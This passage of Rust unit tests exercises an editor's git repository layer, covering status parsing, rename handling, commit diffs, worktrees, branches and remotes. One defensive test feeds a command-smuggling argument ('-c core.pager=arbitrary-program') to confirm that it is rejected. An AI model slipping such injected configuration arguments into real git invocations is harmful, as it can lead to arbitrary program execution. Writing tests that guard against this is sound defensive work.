            version(2, 45, 0)
        );
        assert_eq!(GitVersion::parse(""), None);
        assert_eq!(GitVersion::parse("git version\n"), None);
        assert_eq!(GitVersion::parse("git version 2\n"), None);
        assert_eq!(GitVersion::parse("git version two.17.1\n"), None);
        assert_eq!(GitVersion::parse("bash: git: command not found\n"), None);
    }

    #[test]
    fn test_git_status_args_no_renames_follows_git_version() {
        let args = |git_version: Option<GitVersion>| {
            git_status_args(&[], StatusUntrackedFiles::All, git_version)
                .into_iter()
                .map(|argument| argument.to_string_lossy().into_owned())
                .collect::<Vec<_>>()
        };
        let version = |major, minor, patch| {
            Some(GitVersion {
                major,
                minor,
                patch,
            })
        };

        assert_eq!(
            args(version(2, 10, 5)),
            ["status", "--porcelain", "--untracked-files=all", "-z", "--"]
        );
        assert_eq!(
            args(version(2, 17, 1)),
            [
                "status",
                "--porcelain=v1",
                "--untracked-files=all",
                "-z",
                "--"
            ]
        );
        assert_eq!(
            args(version(2, 18, 0)),
            [
                "status",
                "--porcelain=v1",
                "--untracked-files=all",
                "--no-renames",
                "-z",
                "--"
            ]
        );
        assert_eq!(args(None), args(version(2, 18, 0)));
        assert!(!args(version(2, 17, 99)).contains(&"--no-renames".to_string()));
        for git_version in [version(2, 45, 1), version(3, 0, 0), None] {
            assert!(
                args(git_version).contains(&"--no-renames".to_string()),
                "{git_version:?} should get --no-renames"
            );
        }
    }

    #[test]
    fn test_status_rename_pairs_match_no_renames_output() {
        // The expected entries come from `--no-renames` itself.
        if !installed_git_supports(GitFeature::StatusNoRenames) {
            return;
        }
        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        // Distinct contents, so that git only pairs the files renamed or copied on purpose.
        let contents = |name: &str| {
            (0..20)
                .map(|line| format!("{name} {line}\n"))
                .collect::<String>()
        };
        for name in ["a", "k", "ab c", "r", "x", "orig"] {
            fs::write(repo_dir.join(name), contents(name)).unwrap();
        }
        git_command(&repo_dir, ["add", "."]);
        git_command(&repo_dir, ["commit", "-m", "initial"]);

        fs::write(repo_dir.join("a"), contents("a") + "unstaged\n").unwrap();
        fs::write(repo_dir.join("n"), contents("n")).unwrap();
        fs::write(repo_dir.join("s"), contents("s")).unwrap();
        git_command(&repo_dir, ["add", "s"]);
        git_command(&repo_dir, ["mv", "k", "k2"]);
        fs::write(repo_dir.join("k2"), contents("k") + "unstaged\n").unwrap();
        git_command(&repo_dir, ["mv", "ab c", "moved"]);
        git_command(&repo_dir, ["mv", "r", "r2"]);
        fs::write(repo_dir.join("r"), contents("recreated")).unwrap();
        git_command(&repo_dir, ["rm", "--cached", "x"]);
        fs::write(repo_dir.join("copy"), contents("orig")).unwrap();
        fs::write(repo_dir.join("orig"), contents("orig") + "staged\n").unwrap();
        git_command(&repo_dir, ["add", "copy", "orig"]);

        let status_arguments = ["status", "--porcelain=v1", "--untracked-files=all", "-z"];
        let with_renames = git_command_raw_output(&repo_dir, status_arguments);
        let with_copies = git_command_raw_output(
            &repo_dir,
            ["-c", "status.renames=copies"]
                .into_iter()
                .chain(status_arguments),
        );
        let without_renames = git_command_raw_output(
            &repo_dir,
            status_arguments.into_iter().chain(["--no-renames"]),
        );
        for record in ["RM k2\0k\0", "R  moved\0ab c\0", "R  r2\0r\0"] {
            assert!(
                with_renames.contains(record),
                "{record:?} missing from {with_renames:?}"
            );
        }
        assert!(
            with_copies.contains("C  copy\0orig\0"),
            "no copy record in {with_copies:?}"
        );

        let parse = |output: &str| output.parse::<GitStatus>().unwrap().entries;
        let expected = parse(&without_renames);
        assert_eq!(parse(&with_renames), expected);
        assert_eq!(parse(&with_copies), expected);
    }

    #[gpui::test]
    async fn test_status_with_probed_git_version(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        fs::write(repo_dir.join("k"), "k\n").unwrap();
        git_command(&repo_dir, ["add", "k"]);
        git_command(&repo_dir, ["commit", "-m", "initial"]);
        git_command(&repo_dir, ["mv", "k", "k2"]);

        let repository = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        let status = repository
            .status(
                &[RepoPath::from_rel_path(RelPath::empty())],
                StatusUntrackedFiles::All,
            )
            .await
            .unwrap();
        assert_eq!(
            &*status.entries,
            &[
                (
                    RepoPath::new("k").unwrap(),
                    FileStatus::index(StatusCode::Deleted)
                ),
                (
                    RepoPath::new("k2").unwrap(),
                    FileStatus::index(StatusCode::Added)
                ),
            ]
        );

        let installed_version = GitVersion::parse(&git_command_output(&repo_dir, ["--version"]));
        assert!(
            installed_version.is_some(),
            "the installed git's version should be recognized"
        );
        assert_eq!(repository.git_binary().version().await, installed_version);
    }

    #[track_caller]
    fn git_command_output<I, S>(working_directory: &Path, arguments: I) -> String
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        git_command_raw_output(working_directory, arguments)
            .trim()
            .to_string()
    }

    #[allow(clippy::disallowed_methods)]
    #[track_caller]
    fn git_command_raw_output<I, S>(working_directory: &Path, arguments: I) -> String
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        let output = std::process::Command::new("git")
            .args(arguments)
            .current_dir(working_directory)
            .env("GIT_CONFIG_GLOBAL", "")
            .env("GIT_CONFIG_SYSTEM", "")
            .env("GIT_AUTHOR_NAME", "test")
            .env("GIT_AUTHOR_EMAIL", "test@zed.dev")
            .env("GIT_COMMITTER_NAME", "test")
            .env("GIT_COMMITTER_EMAIL", "test@zed.dev")
            .output()
            .expect("failed to run git command");
        assert!(
            output.status.success(),
            "git command failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8(output.stdout).expect("git command output was not valid UTF-8")
    }

    #[track_caller]
    fn git_command<I, S>(working_directory: &Path, arguments: I)
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        git_command_output(working_directory, arguments);
    }

    fn git_init_repo(path: &Path) {
        fs::create_dir_all(path).expect("failed to create repo directory");
        // `git init -b` only exists since git 2.28.
        git_command(path, ["init"]);
        git_command(path, ["symbolic-ref", "HEAD", "refs/heads/main"]);
    }

    fn clone_remote_repository_with_main_and_feature(temp_dir: &Path) -> (PathBuf, PathBuf) {
        let remote_directory = temp_dir.join("remote.git");
        let seed_directory = temp_dir.join("seed");
        let clone_directory = temp_dir.join("clone");

        git_command(
            temp_dir,
            [
                OsString::from("init"),
                OsString::from("--bare"),
                remote_directory.as_os_str().into(),
            ],
        );
        git_command(
            &remote_directory,
            ["symbolic-ref", "HEAD", "refs/heads/main"],
        );
        git_init_repo(&seed_directory);
        fs::write(seed_directory.join("file.txt"), "main").unwrap();
        git_command(&seed_directory, ["add", "file.txt"]);
        git_command(&seed_directory, ["commit", "-m", "initial"]);
        git_command(&seed_directory, ["checkout", "-b", "feature"]);
        fs::write(seed_directory.join("feature.txt"), "feature").unwrap();
        git_command(&seed_directory, ["add", "feature.txt"]);
        git_command(&seed_directory, ["commit", "-m", "feature"]);
        git_command(
            &seed_directory,
            [
                OsString::from("remote"),
                OsString::from("add"),
                OsString::from("origin"),
                remote_directory.as_os_str().into(),
            ],
        );
        git_command(&seed_directory, ["push", "-u", "origin", "main"]);
        git_command(&seed_directory, ["push", "-u", "origin", "feature"]);
        git_command(
            temp_dir,
            [
                OsString::from("clone"),
                remote_directory.as_os_str().into(),
                clone_directory.as_os_str().into(),
            ],
        );

        (remote_directory, clone_directory)
    }

    fn test_commit_envs() -> HashMap<String, String> {
        let mut env = checkpoint_author_envs();
        env.insert("GIT_ASKPASS".to_string(), "false".to_string());
        env
    }

    #[track_caller]
    fn assert_same_path(left: impl AsRef<Path>, right: impl AsRef<Path>) {
        assert_eq!(
            fs::canonicalize(left.as_ref()).unwrap(),
            fs::canonicalize(right.as_ref()).unwrap()
        );
    }

    #[gpui::test]
    async fn test_real_git_repository_new_resolves_normal_repository_paths(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        assert_same_path(&repository.git_dir, repo_dir.path().join(".git"));
        assert_same_path(&repository.common_dir, repo_dir.path().join(".git"));
        assert_same_path(
            repository.working_directory.as_ref().unwrap(),
            repo_dir.path(),
        );
        assert_same_path(
            original_repo_path_from_common_dir(&repository.common_dir).unwrap(),
            repo_dir.path(),
        );
    }

    #[gpui::test]
    async fn test_merge_base_worktree_diff_handles_recreated_index_deletion(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");
        fs::write(&file_path, "base\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "base"]);
        let base_oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD:file.txt"])
            .parse()
            .unwrap();

        fs::write(&file_path, "head\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "head"]);
        git_command(repo_dir.path(), ["rm", "--cached", "file.txt"]);
        fs::write(&file_path, "base\n").unwrap();

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::default(),
            }
        );

        fs::write(&file_path, "worktree\n").unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::from_iter([(
                    RepoPath::new("file.txt").unwrap(),
                    TreeDiffStatus::Modified { old: base_oid },
                )]),
            }
        );
    }

    #[gpui::test]
    async fn test_merge_base_worktree_diff_handles_committed_deletion_recreated_on_disk(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");
        fs::write(&file_path, "base\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "base"]);
        let base_oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD:file.txt"])
            .parse()
            .unwrap();

        git_command(repo_dir.path(), ["rm", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "delete"]);
        fs::write(&file_path, "base\n").unwrap();

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::default(),
            }
        );

        fs::write(&file_path, "worktree\n").unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::from_iter([(
                    RepoPath::new("file.txt").unwrap(),
                    TreeDiffStatus::Modified { old: base_oid },
                )]),
            }
        );
    }

    #[cfg(unix)]
    #[gpui::test]
    async fn test_merge_base_worktree_diff_handles_recreated_symlink(cx: &mut TestAppContext) {
        use std::os::unix::fs::symlink;

        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");
        symlink("base-target", &file_path).unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "base"]);
        let base_oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD:file.txt"])
            .parse()
            .unwrap();

        fs::remove_file(&file_path).unwrap();
        symlink("head-target", &file_path).unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "head"]);
        git_command(repo_dir.path(), ["rm", "--cached", "file.txt"]);
        fs::remove_file(&file_path).unwrap();
        symlink("base-target", &file_path).unwrap();

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::default(),
            }
        );

        fs::remove_file(&file_path).unwrap();
        fs::write(&file_path, "base-target").unwrap();
        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                    base: "HEAD^".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::from_iter([(
                    RepoPath::new("file.txt").unwrap(),
                    TreeDiffStatus::Modified { old: base_oid },
                )]),
            }
        );
    }

    #[gpui::test]
    async fn test_load_commit_with_type_changed_file(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().expect("failed to create temporary repository");
        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("file.txt"), "regular contents\n")
            .expect("failed to write regular file");
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "initial"]);

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .expect("failed to open repository");
        fs::write(repo_dir.path().join("file.txt"), "target")
            .expect("failed to write symlink target");

        let symlink_blob = repository
            .git_binary()
            .run(&["hash-object", "-w", "file.txt"])
            .await
            .expect("failed to write symlink blob");
        git_command(
            repo_dir.path(),
            [
                OsString::from("update-index"),
                OsString::from("--cacheinfo"),
                OsString::from("120000"),
                OsString::from(symlink_blob),
                OsString::from("file.txt"),
            ],
        );
        git_command(repo_dir.path(), ["commit", "-m", "type change"]);

        let commit_diff = repository
            .load_commit("HEAD".to_string(), false, cx.to_async())
            .await
            .expect("failed to load type-changed commit");
        assert_eq!(commit_diff.files.len(), 1);

        let file = commit_diff
            .files
            .first()
            .expect("type-changed file should be present");
        assert_eq!(file.path.as_unix_str(), "file.txt");
        assert_eq!(
            file.old_content.as_deref(),
            Some(b"regular contents\n".as_slice())
        );
        assert_eq!(file.new_content.as_deref(), Some(b"target".as_slice()));
        assert_eq!(file.status(), CommitFileStatus::Modified);
    }

    #[gpui::test]
    async fn test_load_commit_with_gitlink_changes(cx: &mut TestAppContext) {
        const FIRST_SUBMODULE_COMMIT: &str = "1111111111111111111111111111111111111111";
        const SECOND_SUBMODULE_COMMIT: &str = "2222222222222222222222222222222222222222";

        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().expect("failed to create temporary repository");
        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("README.md"), "parent repository\n")
            .expect("failed to write regular file");
        git_command(repo_dir.path(), ["add", "README.md"]);
        git_command(
            repo_dir.path(),
            [
                "update-index",
                "--add",
                "--cacheinfo",
                crate::commit::GITLINK_MODE,
                FIRST_SUBMODULE_COMMIT,
                "modules/example",
            ],
        );
        git_command(repo_dir.path(), ["commit", "-m", "add submodule"]);

        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .expect("failed to open repository");

        let commit_diff = repository
            .load_commit("HEAD".to_string(), false, cx.to_async())
            .await
            .expect("failed to load commit that adds a gitlink");
        assert_eq!(commit_diff.files.len(), 2);
        let gitlink = commit_diff
            .files
            .iter()
            .find(|file| file.path.as_unix_str() == "modules/example")
            .expect("gitlink should be present alongside the regular file");
        assert_eq!(gitlink.status(), CommitFileStatus::Added);
        assert_eq!(gitlink.old_content, None);
        assert_eq!(
            gitlink.new_content.as_deref(),
            Some(b"Subproject commit 1111111111111111111111111111111111111111\n".as_slice())
        );
        assert!(!gitlink.is_binary);

        git_command(
            repo_dir.path(),
            [
                "update-index",
                "--cacheinfo",
                crate::commit::GITLINK_MODE,
                SECOND_SUBMODULE_COMMIT,
                "modules/example",
            ],
        );
        git_command(repo_dir.path(), ["commit", "-m", "update submodule"]);

        let commit_diff = repository
            .load_commit("HEAD".to_string(), false, cx.to_async())
            .await
            .expect("failed to load commit that updates a gitlink");
        let [gitlink] = commit_diff.files.as_slice() else {
            panic!("expected one updated gitlink");
        };
        assert_eq!(gitlink.status(), CommitFileStatus::Modified);
        assert_eq!(
            gitlink.old_content.as_deref(),
            Some(b"Subproject commit 1111111111111111111111111111111111111111\n".as_slice())
        );
        assert_eq!(
            gitlink.new_content.as_deref(),
            Some(b"Subproject commit 2222222222222222222222222222222222222222\n".as_slice())
        );
        assert!(!gitlink.is_binary);

        git_command(repo_dir.path(), ["rm", "--cached", "modules/example"]);
        git_command(repo_dir.path(), ["commit", "-m", "remove submodule"]);

        let commit_diff = repository
            .load_commit("HEAD".to_string(), false, cx.to_async())
            .await
            .expect("failed to load commit that deletes a gitlink");
        let [gitlink] = commit_diff.files.as_slice() else {
            panic!("expected one deleted gitlink");
        };
        assert_eq!(gitlink.status(), CommitFileStatus::Deleted);
        assert_eq!(
            gitlink.old_content.as_deref(),
            Some(b"Subproject commit 2222222222222222222222222222222222222222\n".as_slice())
        );
        assert_eq!(gitlink.new_content, None);
        assert!(!gitlink.is_binary);
    }

    #[gpui::test]
    async fn test_load_commit_shallow_boundary(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let source_dir = tempfile::tempdir().expect("failed to create source repository");
        git_init_repo(source_dir.path());
        fs::write(source_dir.path().join("a.txt"), "one\n").expect("failed to write a.txt");
        git_command(source_dir.path(), ["add", "a.txt"]);
        git_command(source_dir.path(), ["commit", "-m", "first"]);
        fs::write(source_dir.path().join("a.txt"), "two\n").expect("failed to update a.txt");
        fs::write(source_dir.path().join("b.txt"), "new\n").expect("failed to write b.txt");
        git_command(source_dir.path(), ["add", "a.txt", "b.txt"]);
        git_command(source_dir.path(), ["commit", "-m", "second"]);

        let clone_dir = tempfile::tempdir().expect("failed to create clone directory");
        git_command(
            clone_dir.path(),
            [
                "clone".to_string(),
                "--depth=1".to_string(),
                format!("file://{}", source_dir.path().display()),
                "shallow".to_string(),
            ],
        );

        let repository = RealGitRepository::new(
            &clone_dir.path().join("shallow").join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .expect("failed to open shallow repository");

        let commit_diff = repository
            .load_commit("HEAD".to_string(), false, cx.to_async())
            .await
            .expect("failed to load boundary commit");
        assert!(commit_diff.is_shallow_boundary);
        assert_eq!(commit_diff.files.len(), 0);

        let commit_diff = repository
            .load_commit("HEAD".to_string(), true, cx.to_async())
            .await
            .expect("failed to load boundary commit snapshot");
        assert!(!commit_diff.is_shallow_boundary);
        let files = commit_diff
            .files
            .iter()
            .map(|file| {
                (
                    file.path.as_unix_str().to_owned(),
                    file.old_content.clone(),
                    file.status(),
                )
            })
            .collect::<Vec<_>>();
        assert_eq!(
            files,
            vec![
                ("a.txt".to_string(), None, CommitFileStatus::Added),
                ("b.txt".to_string(), None, CommitFileStatus::Added),
            ]
        );

        let source_repository = RealGitRepository::new(
            &source_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .expect("failed to open source repository");
        let commit_diff = source_repository
            .load_commit("HEAD~1".to_string(), false, cx.to_async())
            .await
            .expect("failed to load root commit");
        assert!(!commit_diff.is_shallow_boundary);
        assert_eq!(commit_diff.files.len(), 1);
    }

    #[gpui::test]
    async fn test_check_access(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        assert!(repository.check_access().await.is_err());
        git_init_repo(repo_dir.path());
        assert!(repository.check_access().await.is_ok());
    }

    #[gpui::test]
    async fn test_real_git_repository_new_resolves_linked_worktree_paths(cx: &mut TestAppContext) {
        if !installed_git_supports(GitFeature::WorktreeAdd) {
            return;
        }
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let worktree_dir = temp_dir.path().join("worktree");
        git_init_repo(&repo_dir);
        fs::write(repo_dir.join("file.txt"), "initial").unwrap();
        git_command(&repo_dir, ["add", "file.txt"]);
        git_command(&repo_dir, ["commit", "-m", "initial"]);
        git_command(
            &repo_dir,
            [
                OsString::from("worktree"),
                OsString::from("add"),
                OsString::from("-b"),
                OsString::from("feature"),
                worktree_dir.as_os_str().into(),
            ],
        );

        let repository = RealGitRepository::new(
            &worktree_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        assert_same_path(
            repository.working_directory.as_ref().unwrap(),
            &worktree_dir,
        );
        assert_same_path(&repository.common_dir, repo_dir.join(".git"));
        assert_same_path(
            original_repo_path_from_common_dir(&repository.common_dir).unwrap(),
            repo_dir,
        );
    }

    #[gpui::test]
    async fn test_real_git_repository_new_supports_bare_repositories(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo.git");
        git_command(
            temp_dir.path(),
            [
                OsString::from("init"),
                OsString::from("--bare"),
                repo_dir.as_os_str().into(),
            ],
        );

        let repository =
            RealGitRepository::new(&repo_dir, None, Some("git".into()), cx.executor()).unwrap();

        assert_same_path(&repository.git_dir, &repo_dir);
        assert_same_path(&repository.common_dir, &repo_dir);
        assert_eq!(repository.working_directory, None);
        assert_same_path(repository.main_repository_path(), &repo_dir);
        assert_eq!(
            repository
                .git_binary()
                .run(&["rev-parse", "--is-bare-repository"])
                .await
                .unwrap(),
            "true"
        );
    }

    #[gpui::test]
    async fn test_change_branch_creates_local_tracking_branch_from_remote(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (_remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());

        let repository = RealGitRepository::new(
            &clone_directory.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repository);
        let git = repository.git_binary_in_worktree().unwrap();
        assert!(
            git.run(&[
                "show-ref",
                "--verify",
                "--quiet",
                "refs/remotes/origin/feature"
            ])
            .await
            .is_ok()
        );
        assert!(
            git.run(&["show-ref", "--verify", "--quiet", "refs/heads/feature"])
                .await
                .is_err()
        );

        repository
            .change_branch("origin/feature".to_string())
            .await
            .unwrap();

        let git = repository.git_binary_in_worktree().unwrap();
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "HEAD"])
                .await
                .unwrap(),
            "feature"
        );
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}",])
                .await
                .unwrap(),
            "origin/feature"
        );

        git.run(&["checkout", "main"]).await.unwrap();
        // `git branch --unset-upstream` only exists since git 1.8.
        git.run(&["config", "--unset", "branch.feature.remote"])
            .await
            .unwrap();
        git.run(&["config", "--unset", "branch.feature.merge"])
            .await
            .unwrap();

        repository
            .change_branch("origin/feature".to_string())
            .await
            .unwrap();

        let git = repository.git_binary_in_worktree().unwrap();
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "HEAD"])
                .await
                .unwrap(),
            "feature"
        );
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}",])
                .await
                .unwrap(),
            "origin/feature"
        );
    }

    #[gpui::test]
    async fn test_change_branch_resolves_remote_head_to_tracking_branch(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (_remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());

        let repository = RealGitRepository::new(
            &clone_directory.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repository);
        let git = repository.git_binary_in_worktree().unwrap();
        git.run(&[
            "symbolic-ref",
            "refs/remotes/origin/HEAD",
            "refs/remotes/origin/feature",
        ])
        .await
        .unwrap();
        assert_eq!(
            git.run(&["symbolic-ref", "refs/remotes/origin/HEAD"])
                .await
                .unwrap(),
            "refs/remotes/origin/feature"
        );
        assert!(
            git.run(&["show-ref", "--verify", "--quiet", "refs/heads/feature"])
                .await
                .is_err()
        );

        repository
            .change_branch("origin/HEAD".to_string())
            .await
            .unwrap();

        let git = repository.git_binary_in_worktree().unwrap();
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "HEAD"])
                .await
                .unwrap(),
            "feature"
        );
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}",])
                .await
                .unwrap(),
            "origin/feature"
        );
    }

    #[gpui::test]
    async fn test_change_branch_resolves_non_origin_remote_head(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());

        git_command(
            &clone_directory,
            [
                OsString::from("remote"),
                OsString::from("add"),
                OsString::from("upstream"),
                remote_directory.as_os_str().into(),
            ],
        );
        git_command(&clone_directory, ["fetch", "upstream"]);

        let repository = RealGitRepository::new(
            &clone_directory.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repository);
        let git = repository.git_binary_in_worktree().unwrap();
        git.run(&[
            "symbolic-ref",
            "refs/remotes/upstream/HEAD",
            "refs/remotes/upstream/main",
        ])
        .await
        .unwrap();
        git.run(&["checkout", "-b", "scratch"]).await.unwrap();

        repository
            .change_branch("upstream/HEAD".to_string())
            .await
            .unwrap();

        let git = repository.git_binary_in_worktree().unwrap();
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "HEAD"])
                .await
                .unwrap(),
            "main"
        );
        assert_eq!(
            git.run(&["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}",])
                .await
                .unwrap(),
            "upstream/main"
        );
    }

    #[gpui::test]
    fn test_real_git_repository_new_rejects_malformed_git_file(cx: &mut TestAppContext) {
        disable_git_global_config();

        let temp_dir = tempfile::tempdir().unwrap();
        let worktree_dir = temp_dir.path().join("worktree");
        fs::create_dir_all(&worktree_dir).unwrap();
        fs::write(worktree_dir.join(".git"), "not a gitdir file\n").unwrap();

        let error = match RealGitRepository::new(
            &worktree_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        ) {
            Ok(_) => panic!("malformed .git file should be rejected"),
            Err(error) => error,
        };

        assert!(
            error
                .to_string()
                .contains("expected .git file to start with 'gitdir: '"),
            "unexpected error: {error:#}"
        );
    }

    fn open_repository(dot_git_parent: &Path, cx: &mut TestAppContext) -> RealGitRepository {
        let repository = RealGitRepository::new(
            &dot_git_parent.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .expect("failed to open repository");
        trust_if_hooks_cannot_be_disabled(&repository);
        repository
    }

    #[gpui::test]
    async fn test_run_command_rejects_arguments_that_are_not_a_known_subcommand(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repository = open_repository(repo_dir.path(), cx);

        // A leading `-c` would let a caller point git at an arbitrary program.
        let error = repository
            .run_command(
                vec![
                    "-c".into(),
                    "core.pager=arbitrary-program".into(),
                    "log".into(),
                ],
                None,
                Arc::new(HashMap::default()),
                HashMap::default(),
            )
            .await
            .expect_err("configuration arguments must be rejected");
        assert!(
            error.to_string().contains("unsupported git command"),
            "unexpected error: {error:#}"
        );

        let error = repository
            .run_command(
                vec!["config".into(), "core.pager".into()],
                None,
                Arc::new(HashMap::default()),
                HashMap::default(),
            )
            .await
            .expect_err("subcommands outside the allowlist must be rejected");
        assert!(
            error.to_string().contains("unsupported git command"),
            "unexpected error: {error:#}"
        );

        let error = repository
            .run_command(
                Vec::new(),
                None,
                Arc::new(HashMap::default()),
                HashMap::default(),
            )
            .await
            .expect_err("an empty command must be rejected");
        assert!(
            error.to_string().contains("no git subcommand"),
            "unexpected error: {error:#}"
        );
    }

    #[gpui::test]
    async fn test_create_and_remove_remote(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repository = open_repository(repo_dir.path(), cx);

        repository
            .create_remote(
                "upstream".to_string(),
                "https://example.com/repo.git".to_string(),
            )
            .await
            .unwrap();

        let remotes = repository.get_all_remotes().await.unwrap();
        assert_eq!(
            remotes
                .iter()
                .map(|remote| remote.name.to_string())
                .collect::<Vec<_>>(),
            vec!["upstream".to_string()]
        );
        assert_eq!(
            repository.remote_url("upstream").await.as_deref(),
            Some("https://example.com/repo.git")
        );

        repository
            .remove_remote("upstream".to_string())
            .await
            .unwrap();
        assert!(repository.get_all_remotes().await.unwrap().is_empty());
    }

    #[gpui::test]
    async fn test_merge_fast_forwards_the_current_branch(cx: &mut TestAppContext) {
